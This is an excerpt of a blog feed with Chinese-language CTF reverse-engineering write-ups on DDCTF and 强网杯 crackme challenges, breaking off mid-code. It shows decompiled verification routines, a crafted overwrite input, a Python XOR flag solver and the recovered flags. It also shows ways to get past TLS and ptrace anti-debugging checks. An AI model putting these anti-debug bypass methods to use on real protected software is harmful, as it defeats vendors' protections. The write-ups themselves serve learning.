a1-&gt;byte299;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现并不行，所以换渠道，直接将Binggo写入6030e0的最后几个字符中，然后被6030e0最后自己的00截断即可。<br>我的指令如下：</p><blockquote><p>;|;}Cc80CH80C&amp;80t(8080C)80totFC%8uuuuuuEs</p></blockquote><h3 id="被隐藏的真实"><a href="#被隐藏的真实" class="headerlink" title="被隐藏的真实"></a>被隐藏的真实</h3><p>好假的题目，重点是题目竟然偷偷换掉了memcmp函数。。纠结<br>题目有三关，第一关第二关比较好过，直接逆向可以得出Correct。<br>第三关因为偷偷换掉了memcmp函数，所以比较郁闷。<br>重点代码verify()如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall Bitcoin::verify(Bitcoin *<span class="keyword">this</span>, <span class="keyword">char</span> *a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+1Bh] [rbp-85h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+40h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+60h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+88h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( counter == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(_DWORD *)a2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( counter == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v8);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v11, a2, &amp;v8);</span><br><span class="line">    sha256((__int64)&amp;v12, (__int64)&amp;v11, <span class="number">0</span>);</span><br><span class="line">    v3 = (<span class="keyword">const</span> <span class="keyword">void</span> *)<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::c_str(&amp;v12, &amp;v11);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v3, &amp;hashes, <span class="number">0x20</span>uLL) )</span><br><span class="line">      v4 = secret_const[counter];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v4 = *((_DWORD *)<span class="keyword">this</span> + <span class="number">2</span>);</span><br><span class="line">    v2 = v4;</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v12);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v11);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v8);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v10, (__int64)a2, <span class="number">80L</span>L);</span><br><span class="line">    sha256((__int64)&amp;v11, (__int64)&amp;v10, <span class="number">0</span>);</span><br><span class="line">    sha256((__int64)&amp;v12, (__int64)&amp;v11, <span class="number">1</span>);</span><br><span class="line">    v5 = (<span class="keyword">const</span> <span class="keyword">void</span> *)<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::c_str(&amp;v12, &amp;v11);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v5, &amp;hashes, <span class="number">32u</span>LL) )</span><br><span class="line">      v6 = secret_const[counter];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v6 = *((_DWORD *)<span class="keyword">this</span> + <span class="number">2</span>);</span><br><span class="line">    v9 = v6;</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v12);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v11);</span><br><span class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v10);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v8);</span><br><span class="line">    v2 = v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>第三关是输入字符串，然后两次sha256，第二个sha256有反转，最后和hashes比较即可，但是memcmp被换掉了，所以跟进去，可以得到真正要比较的值是：</p><blockquote><p>6fe28c0ab6f1b372c1a6a246ae63f74f931e8365e15a089c68d6190000000000 </p></blockquote><p>网页搜索一下，得到输入值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0100000000000000000000000000000000000000000000000000000000000000000000003ba3edfd7a7b12b27ac72c3e67768f617fc81bc3888a51323a9fb8aa4b1e5e4a29ab5f49ffff001d1dac2b7c</span><br></pre></td></tr></table></figure></p><p>但是提交不对，说是要最短输入，更改第二个输入，发现0094EA58ADC3AA65F5C26F6ED27D3FDB0D093DC17F8DC81929不是唯一能通过第二关的值，最短是的值是0094EA58ADC3AA65F5C26F6ED27D3FDB0D093DC17F，没有细究，拿分要紧， 得到flag：</p><blockquote><p>DDCTF{ea1b1cead2021eea14f8e51c60876c15e518076e79dfb62b952d4a7e623cd01a}</p></blockquote><h3 id="探寻逝去的Atlantis文明"><a href="#探寻逝去的Atlantis文明" class="headerlink" title="探寻逝去的Atlantis文明"></a>探寻逝去的Atlantis文明</h3><p>该题很险，差一点丢分，本来想着早点儿起来做的，没想到睡过了。。。。。<br>exe文件，win32平台，打开一看，有tls的反调试，直接去掉即可。<br>很及时的找到了关键点，本来以为g了，哈哈<br>题目利用GlobalAddAtom()函数和GlobalGetAtom()函数来传递字符串，一开始一直绕进01xxxxxx段里面去了， 跟踪堆栈，找到ReadFile读取控制台，然后。。。很晕，还好我机智的跳了出来，定位到了关键点：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__<span class="function">cdecl <span class="title">sub_28F0104</span><span class="params">(_DWORD *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST04_4</span></span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = *a1;</span><br><span class="line">  v9 = a1[<span class="number">1</span>];</span><br><span class="line">  v6 = (<span class="keyword">int</span>)(a1 + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a3; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">1</span>);</span><br><span class="line">    v3 = *(_DWORD *)(v6 + <span class="number">4</span> * v8);</span><br><span class="line">    v9 = (<span class="keyword">unsigned</span> __int8)(v3 + v9);</span><br><span class="line">    v4 = *(_DWORD *)(v6 + <span class="number">4</span> * v9);</span><br><span class="line">    *(_DWORD *)(v6 + <span class="number">4</span> * v8) = v4;</span><br><span class="line">    *(_DWORD *)(v6 + <span class="number">4</span> * v9) = v3;</span><br><span class="line">    *(_BYTE *)(i + a2) ^= *(_BYTE *)(v6 + <span class="number">4</span> * (<span class="keyword">unsigned</span> __int8)(v4 + v3));</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v8;</span><br><span class="line">  result = a1;</span><br><span class="line">  a1[<span class="number">1</span>] = v9;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>a2是输入的字符，经过base64编码，（原来里面搞来搞去就是为了这个），然后异或一个数字，得出结果后跟下面的数字比较:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __<span class="function">cdecl <span class="title">sub_28F04A7</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v3 = <span class="number">-54</span>;</span><br><span class="line">  v4 = <span class="number">-101</span>;</span><br><span class="line">  v5 = <span class="number">-12</span>;</span><br><span class="line">  v6 = <span class="number">101</span>;</span><br><span class="line">  v7 = <span class="number">-60</span>;</span><br><span class="line">  v8 = <span class="number">-49</span>;</span><br><span class="line">  v9 = <span class="number">112</span>;</span><br><span class="line">  v10 = <span class="number">12</span>;</span><br><span class="line">  v11 = <span class="number">74</span>;</span><br><span class="line">  v12 = <span class="number">91</span>;</span><br><span class="line">  v13 = <span class="number">-69</span>;</span><br><span class="line">  v14 = <span class="number">91</span>;</span><br><span class="line">  v15 = <span class="number">40</span>;</span><br><span class="line">  v16 = <span class="number">43</span>;</span><br><span class="line">  v17 = <span class="number">7</span>;</span><br><span class="line">  v18 = <span class="number">-24</span>;</span><br><span class="line">  v19 = <span class="number">-50</span>;</span><br><span class="line">  v20 = <span class="number">-102</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">77</span>;</span><br><span class="line">  v23 = <span class="number">103</span>;</span><br><span class="line">  v24 = <span class="number">-94</span>;</span><br><span class="line">  v25 = <span class="number">-65</span>;</span><br><span class="line">  v26 = <span class="number">19</span>;</span><br><span class="line">  <span class="keyword">return</span> a2 == <span class="number">24</span> &amp;&amp; !<span class="built_in">memcmp</span>(a1, &amp;v3, <span class="number">0x18</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>动态调试获取 <em>(_BYTE </em>)(v6 + 4 * (unsigned __int8)(v4 + v3));中的异或的数字，然后很舒服：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str = [<span class="number">0x98</span>,<span class="number">0xde</span>,<span class="number">0xa6</span>,<span class="number">0x21</span>,<span class="number">0x92</span>,<span class="number">0x8a</span>,<span class="number">0x2a</span>,<span class="number">0x3b</span>,<span class="number">0x2f</span>,<span class="number">0x13</span>,<span class="number">0xd7</span>,<span class="number">0x6d</span>,<span class="number">0x61</span>,<span class="number">0x51</span>,<span class="number">0x4a</span>,<span class="number">0x82</span>,<span class="number">0x94</span>,<span class="number">0xdd</span>,<span class="number">0x39</span>,<span class="number">0x23</span>,<span class="number">0x3f</span>,<span class="number">0x91</span>,<span class="number">0x8f</span>,<span class="number">0x2e</span>]</span><br><span class="line">str2 =[ <span class="number">0xCA</span>,<span class="number">0x9B</span>, <span class="number">0xF4</span> ,<span class="number">0x65</span>,<span class="number">0xC4</span>,<span class="number">0xCF</span>,<span class="number">0x70</span>,<span class="number">0xC</span>,<span class="number">0x4A</span>,<span class="number">0x5B</span>,<span class="number">0xBB</span>,<span class="number">91</span>,<span class="number">0x28</span>,<span class="number">0x2B</span>,<span class="number">7</span>,<span class="number">0xE8</span>,<span class="number">0xCE</span>,<span class="number">0x9A</span>,<span class="number">0</span>,<span class="number">0x4D</span>,<span class="number">0x67</span>,<span class="number">0xA2</span>,<span class="number">0xBF</span>,<span class="number">0x13</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(str2)):</span><br><span class="line">    <span class="keyword">print</span> chr(str2[i]^str[i]),</span><br></pre></td></tr></table></figure></p><p>得出结果RERDVEZ7eHl6IzMjZG9nX30= 即</p><blockquote><p>DDCTF{xyz####3####dog_}</p></blockquote><p>回头一看，还有7分钟，- -</p><p>唯一很遗憾的是不能去交流会，瞻仰各位大佬，哎，web一点不会，菜到不行</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;╯°□°）╯︵-┻━┻&quot;&gt;&lt;a href=&quot;#╯°□°）╯︵-┻━┻&quot; class=&quot;headerlink&quot; title=&quot;(╯°□°）╯︵ ┻━┻&quot;&gt;&lt;/a&gt;(╯°□°）╯︵ ┻━┻&lt;/h3&gt;&lt;p&gt;想了很久，对着发呆了一天，然后试了下偏移解码。。。然后就对了，每
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>强网杯的hide思路解析</title>
    <link href="https://foyjog.github.io/2018/04/04/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%9A%84hide%E6%80%9D%E8%B7%AF%E8%A7%A3%E6%9E%90/"/>
    <id>https://foyjog.github.io/2018/04/04/强网杯的hide思路解析/</id>
    <published>2018-04-04T09:19:42.000Z</published>
    <updated>2018-07-03T08:19:37.749Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>这个题目其实，，，我最后没有得出确切的结论，因为比赛已经结束了，没有机会验证。<br>这个题一看，很容易得出是个linux下的upx程序，脱壳对于我来说是不可能了，除了利用upx -d这种试了一下发现没啥鸟用，就没有再关心这个壳，其实压缩壳加密壳直接带壳跑也没啥。</p><h3 id="思路流程"><a href="#思路流程" class="headerlink" title="思路流程"></a>思路流程</h3><p>题目好像不是很难的感觉，只是分析的时候多点儿时间就可以了，放如ida，然后运行，发现程序瞬间退出了，确定程序做了反调试的机制，利用strace做跟踪，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">access(<span class="string">"/etc/ld.so.nohwcap"</span>, F_OK)      = <span class="number">-1</span> ENOENT (No such file <span class="keyword">or</span> directory)</span><br><span class="line">ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>)   = <span class="number">-1</span> EPERM (Operation <span class="keyword">not</span> permitted)</span><br><span class="line">ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>)   = <span class="number">-1</span> EPERM (Operation <span class="keyword">not</span> permitted)</span><br><span class="line">exit_group(<span class="number">0</span>)                           = ?</span><br><span class="line">+++ exited with <span class="number">0</span> +++</span><br><span class="line">foyjog@ubuntu:~/Desktop/ctf/<span class="number">00</span>ctf$</span><br></pre></td></tr></table></figure></p><p>初步猜测是用的ptrace自身来达到反调试的效果，一开始我通过硬件断点到hide段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hide00000000006CC00000000000006CD000RWXD.byte0000publicCODE6400000000000000000000</span><br></pre></td></tr></table></figure></p><p>的方法查到了函数判断点如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_4009EF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v0; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rt1</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ((__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))qword_43F0D8[<span class="number">85</span>])(<span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L) )</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(_QWORD))qword_40E0D8[<span class="number">319</span>])(<span class="number">0L</span>L);</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">signed</span> __int64, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">signed</span> __int64))qword_43E0D8[<span class="number">283</span>])(<span class="number">1L</span>L, <span class="string">"Enter the flag:\n"</span>, <span class="number">16L</span>L);</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(_QWORD, <span class="keyword">char</span> *, <span class="keyword">signed</span> __int64))qword_43E0D8[<span class="number">271</span>])(<span class="number">0L</span>L, &amp;v5, <span class="number">32L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_4009AE(&amp;v5) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="string">"You are right\n"</span>;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">signed</span> __int64, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">signed</span> __int64))qword_43E0D8[<span class="number">283</span>])(<span class="number">1L</span>L, <span class="string">"You are right\n"</span>, <span class="number">14L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="string">"You are wrong\n"</span>;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">signed</span> __int64, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">signed</span> __int64))qword_43E0D8[<span class="number">283</span>])(<span class="number">1L</span>L, <span class="string">"You are wrong\n"</span>, <span class="number">14L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = v4 ^ v6;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != v6 )</span><br><span class="line">    sub_442480(<span class="number">1L</span>L, v0, v1, v3);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟踪到如下ptrace点：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">000000000043F</span>380 loc_43F380:                             ; CODE XREF: sub_4009EF+<span class="number">30</span>↑p</span><br><span class="line">LOAD:<span class="number">000000000043F</span>380 lea     rax, [rsp+<span class="number">8</span>]</span><br><span class="line">LOAD:<span class="number">000000000043F</span>385 lea     r8d, [rdi<span class="number">-1</span>]</span><br><span class="line">LOAD:<span class="number">000000000043F</span>389 lea     r10, [rsp<span class="number">-50</span>h]</span><br><span class="line">LOAD:<span class="number">000000000043F</span>38E mov     [rsp<span class="number">-28</span>h], rsi</span><br><span class="line">LOAD:<span class="number">000000000043F</span>393 mov     [rsp<span class="number">-20</span>h], rdx</span><br><span class="line">LOAD:<span class="number">000000000043F</span>398 mov     edi, edi</span><br><span class="line">LOAD:<span class="number">000000000043F</span>39A mov     [rsp<span class="number">-40</span>h], rax</span><br><span class="line">LOAD:<span class="number">000000000043F</span>39F lea     rax, [rsp<span class="number">-30</span>h]</span><br><span class="line">LOAD:<span class="number">000000000043F</span>3A4 cmp     r8d, <span class="number">2</span></span><br><span class="line">LOAD:<span class="number">000000000043F</span>3A8 mov     [rsp<span class="number">-18</span>h], rcx</span><br><span class="line">LOAD:<span class="number">000000000043F</span>3AD movsxd  rsi, dword ptr [rsp<span class="number">-28</span>h]</span><br><span class="line">LOAD:<span class="number">000000000043F</span>3B2 cmova   r10, rcx</span><br><span class="line">LOAD:<span class="number">000000000043F</span>3B6 mov     [rsp<span class="number">-38</span>h], rax</span><br><span class="line">LOAD:<span class="number">000000000043F</span>3BB mov     dword ptr [rsp<span class="number">-48</span>h], <span class="number">18</span>h</span><br><span class="line">LOAD:<span class="number">000000000043F</span>3C3 mov     eax, <span class="number">65</span>h</span><br><span class="line">LOAD:<span class="number">000000000043F</span>3C8 syscall                                 ; LINUX - sys_ptrace</span><br></pre></td></tr></table></figure></p><p>我很开心，但是，，，，好吧，我承认我gg与此点，再草了sub_4009AE函数很久之后，放弃了，问一下大佬，说这个ptrace是假的。。。其实有另外一个ptrace函数= =<br>ok，利用gdb catch syscall ptrace 命令，我跟踪到了如下点（一开始就该这么做的=======）：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x4c8eb1</span>:syscall </span><br><span class="line">=&gt; <span class="number">0x4c8eb3</span>:cmp    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x4c8eb6</span>:jne    <span class="number">0x4c8fdb</span></span><br><span class="line">   <span class="number">0x4c8ebc</span>:xor    rdi,rdi</span><br><span class="line">   <span class="number">0x4c8ebf</span>:inc    rdi</span><br><span class="line">   <span class="number">0x4c8ec2</span>:mov    rsi,<span class="number">0x4a091c</span></span><br><span class="line">[------------------------------------<span class="built_in">stack</span>-------------------------------------]</span><br><span class="line"><span class="number">0000</span>| <span class="number">0x7fffffffcca8</span> --&gt; <span class="number">0x401697</span> (add    rbx,<span class="number">0x1</span>)</span><br><span class="line"><span class="number">0008</span>| <span class="number">0x7fffffffccb0</span> --&gt; <span class="number">0x4002c8</span> (sub    rsp,<span class="number">0x8</span>)</span><br><span class="line"><span class="number">0016</span>| <span class="number">0x7fffffffccb8</span> --&gt; <span class="number">0x6c9018</span> --&gt; <span class="number">0x43a500</span> (mov    rcx,rsi)</span><br><span class="line"><span class="number">0024</span>| <span class="number">0x7fffffffccc0</span> --&gt; <span class="number">0x401620</span> (push   r14)</span><br><span class="line"><span class="number">0032</span>| <span class="number">0x7fffffffccc8</span> --&gt; <span class="number">0x4016b0</span> (push   rbx)</span><br><span class="line"><span class="number">0040</span>| <span class="number">0x7fffffffccd0</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">0048</span>| <span class="number">0x7fffffffccd8</span> --&gt; <span class="number">0x400cae</span> (xor    edi,edi)</span><br><span class="line"><span class="number">0056</span>| <span class="number">0x7fffffffcce0</span> --&gt; <span class="number">0x0</span> </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Catchpoint <span class="number">1</span> (call to syscall ptrace), <span class="number">0x00000000004c8eb3</span> in ?? ()</span><br></pre></td></tr></table></figure></p><p>很烦，，，跟踪到如下过程，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 